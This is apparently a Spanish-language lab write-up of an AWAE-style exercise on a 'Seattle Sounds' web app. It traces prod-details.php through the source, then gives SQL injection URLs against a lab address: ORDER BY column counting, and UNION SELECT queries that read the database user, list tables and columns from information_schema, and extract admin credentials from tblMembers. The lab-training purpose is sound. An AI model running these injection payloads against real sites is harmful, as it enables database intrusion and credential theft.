...
1. **Obtención de cabeceras**
   ...
   ![cabeceras](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/cabeceras.png)
...
![2-directorios](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/2-directorios.png)
...
![3-sql](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/3-sql.png)

2. En base a los resultados obtenidos, se realiza otra búsqueda más completa:

![3-sql_completada](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/3-sql_completada.png)
...
![file_prod_details](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/file_prod_details.png)
...
![4-Uso_file_prod_details](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/4-Uso_file_prod_details.png)

- A su vez, el fichero details.php es accesible desde: display.php

![5-Uso_file_details](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/5-Uso_file_details.png)

- Y finalmente el fichero display.php es utilizado en el fichero: product.php

![5-Uso_file_display](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/5-Uso_file_display.png)
...
![8-menu_prodcuts](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/8-menu_prodcuts.png)
Otra posibilidad, seria, probar directamente con una petición GET con el parámetro PROD y la cookie level=1

#### Comprobación

1. La configuración es:

   ![9-configuracion](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/9-configuracion.png)

2. Resultado:

   ​		![9-configuracion_response](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/9-configuracion_response.png)

   
   Y en el caso de inyección SQL:

   ![9-configuracion_response_inyeccion](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/9-configuracion_response_inyeccion.png)
...
2. Número de columnas
   ...
   - http://192.168.1.14/prod-details.php?prod=1+ORDER+BY+6
     ...
     ![10-error_columns](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/10-error_columns.png)

   - http://192.168.1.14/prod-details.php?prod=1+ORDER+BY+4

     ![10-error_columns4](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/10-error_columns4.png)

   - http://192.168.1.14/prod-details.php?prod=1+ORDER+BY+5

     ![10-true_columns5](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/10-true_columns5.png)
...
3. Consideración sobre lo que se muestra por pantalla
      ...
      1. En el código del fichero "prod-details.php" se puede ver que lo único que se mostrara por pantalla es lo siguiente:
            ...
            ![11-resultados por pantalla](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/11-resultados%20por%20pantalla.png)
...
4. Identificación de la versión
   ...
   ![12-Version](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/12-Version.png)

5. Usuario de ejecución

   - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2CUSER%28%29%2CNULL%2CNULL

     ![13-users](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/13-users.png)
...
6. Información database
   ...
   ![14-table](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/14-table.png)
...
7. Tablas de seattle
      ...
      - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Ctable_name%2CNULL%2CNULL+FROM+information_schema.tables+WHERE+table_schema+%3D+%27seattle%27
        ...
        ![15-tablas](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/15-tablas.png)
...
9. Datos de user:password
      ...
      ![16-id](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/16-id.png)
      ...
      - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Ccolumn_name%2CNULL%2CNULL+FROM+information_schema.columns+WHERE+table_schema+%3D+%27seattle%27+AND+table_name+%3D%27tblMembers%27+LIMIT+1%2C1
        ...
        ![17-username](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/17-username.png)
...
1. Credenciales del admin: 
   ...
   ![18-credenciales](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/18-credenciales.png)
   
   
   
   ![18-final](https://github.com/Nyanyi/Awae/blob/main/exercices/seattle_sounds/images/18-final.png)
